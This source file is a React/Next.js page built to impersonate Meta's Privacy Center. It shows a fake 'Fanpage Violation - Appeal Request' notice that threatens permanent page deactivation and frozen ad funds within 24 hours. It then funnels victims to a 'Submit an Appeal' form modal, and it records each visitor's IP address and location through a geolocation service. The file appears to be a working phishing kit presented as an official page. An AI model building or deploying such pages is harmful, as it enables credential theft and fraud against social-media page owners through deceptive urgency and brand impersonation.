'use client';
import BackgroundImage from '@/assets/images/bg-image.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import WarningImage from '@/assets/images/warning.png';
import useTranslation from '@/hooks/useTranslation';
import { store } from '@/store/store';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image, { type StaticImageData } from 'next/image';
import { useEffect, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

const menuItems: MenuItem[] = [
    {
        id: 'home',
        icon: faHouse,
        label: 'Privacy Center Home Page',
        isActive: true
    },
    {
        id: 'search',
        icon: faMagnifyingGlass,
        label: 'Search'
    },
    {
        id: 'privacy',
        icon: faLock,
        label: 'Privacy Policy'
    },
    {
        id: 'rules',
        icon: faCircleInfo,
        label: 'Other rules and articles'
    },
    {
        id: 'settings',
        icon: faGear,
        label: 'Settings'
    }
];

interface InfoCardItem {
    id: string;
    title: string;
    subtitle: string;
    image?: StaticImageData;
}

const privacyCenterItems: InfoCardItem[] = [
    {
        id: 'policy',
        title: 'What is the Privacy Policy and what does it say?',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    },
    {
        id: 'manage',
        title: 'How you can manage or delete your information',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    }
];

const agreementItems: InfoCardItem[] = [
    {
        id: 'meta-ai',
        title: 'AI Product',
        subtitle: 'User Agreement',
        image: MetaAI
    }
];

const resourceItems: InfoCardItem[] = [
    {
        id: 'generative-ai',
        title: 'How Meta uses information for generative AI models',
        subtitle: 'Privacy Center'
    },
    {
        id: 'ai-systems',
        title: 'Cards with information about the operation of AI systems',
        subtitle: 'Product AI website'
    },
    {
        id: 'intro-ai',
        title: 'Introduction to Generative AI',
        subtitle: 'For teenagers'
    }
];

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const { t } = useTranslation();
    const [modalKey, setModalKey] = useState(0);

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>{t('Fanpage Violation - Appeal Request')}</title>
            <div className='flex w-full max-w-[1100px]'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                    <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                    {menuItems.map((item) => {
                        const links: Record<string, string> = {
                            home: '',
                            search: '',
                            privacy: 'https://www.facebook.com/privacy/policy/',
                            rules: 'https://www.facebook.com/help/1857475815828426',
                            settings: 'https://www.facebook.com/settings'
                        };
                        const link = links[item.id];

                        return (
                            <a key={item.id} href={link || '#'} target={link ? '_blank' : ''} rel={link ? 'noopener noreferrer' : ''} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium no-underline ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                                <FontAwesomeIcon icon={item.icon} />
                                <p>{t(item.label)}</p>
                            </a>
                        );
                    })}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
                        <p className='text-2xl font-bold'>{t('Fanpage Violation - Appeal Request')}</p>
                    </div>
                    <p>{t("We have detected that your page has violated Meta's Community Standards and Advertising Policies. As a result, your page has been flagged as non-compliant. This may lead to restrictions or, in more serious cases, permanent deactivation of your page and associated ad accounts.")}</p>
                    <p>{t('This is your final notice. If no action is taken within 24 hours, your page will be permanently disabled, and any remaining ad credit balance will be frozen. These funds will not be recoverable after the deadline.')}</p>
                    <p>{t('To appeal this decision and keep your page active, please complete the verification form below. Our system requires accurate information to process your appeal. Missing or incorrect details may delay the review process, and your request may be automatically rejected.')}</p>

                    <div className='overflow-hidden rounded-[12px] bg-[#e1eef7] p-[14px]'>
                        <Image src={BackgroundImage} alt='' className='h-auto w-full rounded-[8px]' />

                        <div className='mt-[10px] rounded-[12px] bg-white px-[14px] py-[13px]'>
                            <p className='mb-[6px] text-[14px] font-medium text-[#050505]'>{t('Appeal Request')}</p>
                            <p className='text-[14px] leading-[1.3] font-bold text-[#050505]'>{t('Confirming your page ownership and identity to appeal this decision')}</p>
                            <p className='mt-[6px] text-[13.5px] leading-[1.35] text-[#050505]'>{t('Please make sure to provide the required information below. Missing details may delay the processing of your request.')}</p>
                        </div>

                        <button
                            onClick={() => {
                                setModalKey((prev) => prev + 1);
                                setModalOpen(true);
                            }}
                            className='mt-[14px] flex h-[38px] w-full items-center justify-center rounded-full bg-[#0866ff] text-[13px] font-bold text-white'
                        >
                            {t('Submit an Appeal')}
                        </button>
                    </div>

                    <div className='flex flex-col gap-4'>
                        <div>
                            <p className='mb-2 text-[16px] font-semibold'>Privacy Center</p>
                            <div className='overflow-hidden rounded-[15px] bg-white'>
                                {privacyCenterItems.map((item, index) => {
                                    const isFirst = index === 0;
                                    const isLast = index === privacyCenterItems.length - 1;
                                    const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px]' : isLast ? 'rounded-b-[15px]' : '';

                                    return (
                                        <a key={item.id} href='https://www.facebook.com/privacy/policy/' target='_blank' rel='noopener noreferrer' className={`flex cursor-pointer items-center gap-3 border-b border-[#e4e6eb] px-4 py-3 no-underline transition hover:bg-[#f5f6f7] ${roundedClass}`}>
                                            {item.image && <Image src={item.image} alt='' className='h-10 w-10' />}
                                            <div className='flex flex-1 flex-col'>
                                                <p className='text-[16px] leading-[1.25]'>{item.title}</p>
                                                <p className='text-[14px] text-[#344854]'>{item.subtitle}</p>
                                            </div>
                                            <FontAwesomeIcon icon={faChevronRight} className='h-4 w-4 text-[#8a8d91]' />
                                        </a>
                                    );
                                })}
                            </div>
                        </div>

                        <div>
                            <p className='mb-2 text-[16px] font-semibold'>{t('For more details, see the User Agreement')}</p>
                            <div className='overflow-hidden rounded-[15px] bg-white'>
                                {agreementItems.map((item, index) => {
                                    const isFirst = index === 0;
                                    const isLast = index === agreementItems.length - 1;
                                    const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px]' : isLast ? 'rounded-b-[15px]' : '';

                                    return (
                                        <a key={item.id} href='https://www.facebook.com/terms/' target='_blank' rel='noopener noreferrer' className={`flex cursor-pointer items-center gap-3 border-b border-[#e4e6eb] px-4 py-3 no-underline transition hover:bg-[#f5f6f7] ${roundedClass}`}>
                                            {item.image && <Image src={item.image} alt='' className='h-10 w-10' />}
                                            <div className='flex flex-1 flex-col'>
                                                <p className='text-[16px] leading-[1.25]'>{t(item.title)}</p>
                                                <p className='text-[14px] text-[#344854]'>{t(item.subtitle)}</p>
                                            </div>
                                            <FontAwesomeIcon icon={faChevronRight} className='h-4 w-4 text-[#8a8d91]' />
                                        </a>
                                    );
                                })}
                            </div>
                        </div>

                        <div>
                            <p className='mb-2 text-[16px] font-semibold'>{t('Additional resources')}</p>
                            <div className='overflow-hidden rounded-[15px] bg-white'>
                                {resourceItems.map((item, index) => {
                                    const isFirst = index === 0;
                                    const isLast = index === resourceItems.length - 1;
                                    const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px]' : isLast ? 'rounded-b-[15px]' : '';

                                    return (
                                        <a key={item.id} href='https://www.facebook.com/privacy/center' target='_blank' rel='noopener noreferrer' className={`flex cursor-pointer items-center gap-3 border-b border-[#e4e6eb] px-4 py-3 no-underline transition hover:bg-[#f5f6f7] ${roundedClass}`}>
                                            {item.image && <Image src={item.image} alt='' className='h-10 w-10' />}
                                            <div className='flex flex-1 flex-col'>
                                                <p className='text-[16px] leading-[1.25]'>{t(item.title)}</p>
                                                <p className='text-[14px] text-[#344854]'>{t(item.subtitle)}</p>
                                            </div>
                                            <FontAwesomeIcon icon={faChevronRight} className='h-4 w-4 text-[#8a8d91]' />
                                        </a>
                                    );
                                })}
                            </div>
                        </div>

                        <p className='text-[15px] leading-[1.45] text-[#344854]'>
                            We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks.{' '}
                            <a href='https://www.facebook.com/privacy/policy/' target='_blank' rel='noopener noreferrer' className='text-[#0866ff] hover:underline'>
                                Read more about Privacy Policy.
                            </a>
                        </p>
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
